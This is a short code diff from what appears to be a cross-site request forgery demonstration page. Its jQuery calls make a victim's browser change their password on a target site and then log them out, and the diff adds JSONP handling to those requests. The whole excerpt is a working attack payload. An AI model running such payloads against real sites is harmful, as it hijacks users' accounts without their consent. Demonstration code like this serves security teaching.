@@ -13,23 +13,27 @@
             $.ajax({
                 url : '<?php echo $target_site?>/change/password',
                 type : 'POST', 
+                dataType : 'jsonp', 
                 data : { 
                     password : 'toto'
                 }
             })
             .done(function(res) {
                 $.ajax({
-                    url : '<?php echo $target_site?>/CSRF-Attack/logout'
+                    url : '<?php echo $target_site?>/CSRF-Attack/logout',
+					dataType : 'jsonp'
                 })
             });        
         }
         function changePwdGet(){
             $.ajax({
-                url : '<?php echo $target_site?>/change/password/level2?pwd=<?php echo $new_password?>'
+                url : '<?php echo $target_site?>/change/password/level2?pwd=<?php echo $new_password?>',
+				dataType : 'jsonp'
             })
             .done(function(res) {
                 $.ajax({
-                    url : '<?php echo $target_site?>/CSRF-Attack/logout'
+                    url : '<?php echo $target_site?>/CSRF-Attack/logout',
+					dataType : 'jsonp'
                 })
             });        
         }
